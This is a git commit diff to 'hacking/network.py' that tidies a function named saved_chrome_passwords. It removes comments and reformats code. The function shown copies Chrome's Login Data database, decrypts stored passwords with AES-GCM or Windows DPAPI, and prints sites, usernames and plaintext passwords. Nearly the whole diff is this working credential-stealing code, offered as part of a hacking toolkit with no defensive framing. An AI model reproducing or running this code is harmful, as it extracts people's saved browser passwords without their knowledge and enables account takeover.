3450e1e94f1f7b01a00437a15fd5befbec71be19
PM-95025 <50608884+PM-95025@users.noreply.github.com>
2022-03-28 17:04:54 +0300

    changed `saved_chrome_passwords`

--- hacking/network.py
+++ hacking/network.py
@@ -276,21 +276,17 @@ def saved_chrome_passwords() -> None:
 
 	def decrypt_password(password, key):
 		try:
-			# get the initialization vector
 			iv = password[3:15]
 			password = password[15:]
-			# generate cipher
 			cipher = AES.new(key, AES.MODE_GCM, iv)
-			# decrypt __password
 			return cipher.decrypt(password)[:-16].decode()
 		except:
 			try:
 				return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
 			except:
 				# not supported
-				return ""
+				return ''
 
-	# get the AES key
 	key = get_encryption_key()
 	# local sqlite Chrome database path
 	db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
@@ -298,13 +294,10 @@ def saved_chrome_passwords() -> None:
 	# as the database will be locked if chrome is currently running
 	filename = "ChromeData.db"
 	shutil.copyfile(db_path, filename)
-	# connect to the database
 	db = sqlite3.connect(filename)
 	cursor = db.cursor()
-	# `logins` table has the data we need
-	cursor.execute(
-		"select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
-	# iterate over all rows
+	cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
+
 	for row in cursor.fetchall():
 		origin_url = row[0]
 		action_url = row[1]
@@ -312,6 +305,7 @@ def saved_chrome_passwords() -> None:
 		password = decrypt_password(row[3], key)
 		date_created = row[4]
 		date_last_used = row[5]
+
 		if username or password:
 			print(f"Origin URL: {origin_url}")
 			print(f"Action URL: {action_url}")
@@ -319,18 +313,19 @@ def saved_chrome_passwords() -> None:
 			print(f"Password: {password}")
 		else:
 			continue
-		if date_created != 86400000000 and date_created:
+
+		if date_created != 86_400_000_000 and date_created:
 			print(f"Creation date: {str(get_chrome_datetime(date_created))}")
-		if date_last_used != 86400000000 and date_last_used:
+		if date_last_used != 86_400_000_000 and date_last_used:
 			print(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
+
 		print("=" * 50)
 
 	cursor.close()
 	db.close()
 	try:
-		# try to remove the copied db file
 		os.remove(filename)
-	except:
+	except (IsADirectoryError, FileNotFoundError, OSError):
 		pass
 
 	return
